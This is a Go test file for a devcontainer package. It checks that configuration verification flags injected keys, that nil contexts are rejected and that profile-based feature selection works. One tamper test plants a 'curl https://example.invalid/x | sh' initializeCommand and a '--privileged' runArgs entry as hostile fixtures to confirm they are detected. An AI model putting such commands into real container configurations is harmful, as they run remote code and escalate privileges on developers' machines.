package devcontainer

import (
	"bytes"
	"context"
	"errors"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

// injectTopLevelKey places an extra member at the head of a rendered configuration.
func injectTopLevelKey(t *testing.T, data []byte, member string) []byte {
	t.Helper()
	open := bytes.IndexByte(data, '{')
	if open < 0 {
		t.Fatal("rendered configuration carries no object")
	}
	tampered := make([]byte, 0, len(data)+len(member)+4)
	tampered = append(tampered, data[:open+1]...)
	tampered = append(tampered, []byte("\n  "+member+",")...)
	return append(tampered, data[open+1:]...)
}

// TestVerifySeesKeysOutsideTheManagedSchema covers the whole file, not the seven
// fields the struct happens to carry: an injected key is drift, never silence.
func TestVerifySeesKeysOutsideTheManagedSchema(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "devcontainer.json")
	dc := &DevContainer{Name: "schema-test", RemoteUser: DefaultRemoteUser, PostCreateCommand: "make verify-all"}
	if err := WriteDevContainer(t.Context(), path, dc); err != nil {
		t.Fatal(err)
	}
	rendered, err := Render(dc)
	if err != nil {
		t.Fatal(err)
	}

	// 1. Positive: the configuration Praetor wrote still verifies.
	if err := Verify(t.Context(), path, dc); err != nil {
		t.Fatalf("matching configuration rejected: %v", err)
	}

	// 2. Negative and 3. boundary: injected keys, including one whose value is null.
	for _, tc := range []struct{ name, member, key string }{
		{"initializeCommand", `"initializeCommand": "curl https://example.invalid/x | sh"`, "initializeCommand"},
		{"runArgs", `"runArgs": ["--privileged"]`, "runArgs"},
		{"nullOnCreateCommand", `"onCreateCommand": null`, "onCreateCommand"},
	} {
		t.Run(tc.name, func(t *testing.T) {
			if err := os.WriteFile(path, injectTopLevelKey(t, rendered, tc.member), 0644); err != nil {
				t.Fatal(err)
			}
			err := Verify(t.Context(), path, dc)
			if err == nil {
				t.Fatal("tampered configuration reported as in sync")
			}
			if !strings.Contains(err.Error(), tc.key) {
				t.Fatalf("error does not name the injected key: %v", err)
			}
		})
	}
}

// TestDevContainerEntryPointsRejectAbsentContext enters the nil guards that the
// cancelled-context cases never reach.
func TestDevContainerEntryPointsRejectAbsentContext(t *testing.T) {
	var absent context.Context
	path := filepath.Join(t.TempDir(), "devcontainer.json")
	dc := &DevContainer{Name: "absent-context"}

	if err := WriteDevContainer(absent, path, dc); err == nil || !strings.Contains(err.Error(), "context cannot be nil") {
		t.Fatalf("WriteDevContainer accepted an absent context: %v", err)
	}
	if _, err := LoadDevContainer(absent, path); err == nil || !strings.Contains(err.Error(), "context cannot be nil") {
		t.Fatalf("LoadDevContainer accepted an absent context: %v", err)
	}
	if err := WriteBundle(absent, path, &Bundle{Config: dc}, false); err == nil || !strings.Contains(err.Error(), "requires context") {
		t.Fatalf("WriteBundle accepted an absent context: %v", err)
	}
	if _, err := os.Stat(path); !errors.Is(err, os.ErrNotExist) {
		t.Fatalf("an absent context still produced a file: %v", err)
	}
}

// TestSynthesizeFeaturesFollowsProfiles pins the profile gate on the legacy
// feature set, which has no catalog selection to fall back on.
func TestSynthesizeFeaturesFollowsProfiles(t *testing.T) {
	// 1. Positive: a repository without the native toolchain keeps the Go feature.
	plain, err := SynthesizeFromProfiles("app", []string{"framework"}, nil)
	if err != nil {
		t.Fatal(err)
	}
	if _, ok := plain.Features[GoFeatureRef]; !ok {
		t.Fatal("Go feature dropped for a Go repository")
	}

	// 2. Negative: the native GPU profile rejects Go tooling, so it gets no Go feature.
	native, err := SynthesizeFromProfiles("engine", []string{"  Native-GPU-Systems  "}, nil)
	if err != nil {
		t.Fatal(err)
	}
	if _, ok := native.Features[GoFeatureRef]; ok {
		t.Fatal("Go feature injected for native-gpu-systems")
	}
	for _, name := range native.Customizations.VSCode.Extensions {
		if name == "golang.go" {
			t.Fatal("Go extension injected for native-gpu-systems")
		}
	}

	// 3. Boundary: an empty profile set keeps Go, and an oversized one terminates.
	empty, err := SynthesizeFromProfiles("app", []string{}, nil)
	if err != nil {
		t.Fatal(err)
	}
	if _, ok := empty.Features[GoFeatureRef]; !ok {
		t.Fatal("Go feature dropped for an empty profile set")
	}
	oversized := make([]string, MaxLoopLimit+8)
	for i := range oversized {
		oversized[i] = "framework"
	}
	oversized[MaxLoopLimit+1] = "native-gpu-systems"
	bounded, err := SynthesizeFromProfiles("app", oversized, nil)
	if err != nil {
		t.Fatal(err)
	}
	if _, ok := bounded.Features[GoFeatureRef]; !ok {
		t.Fatal("profiles beyond the scalar bound were read")
	}
}
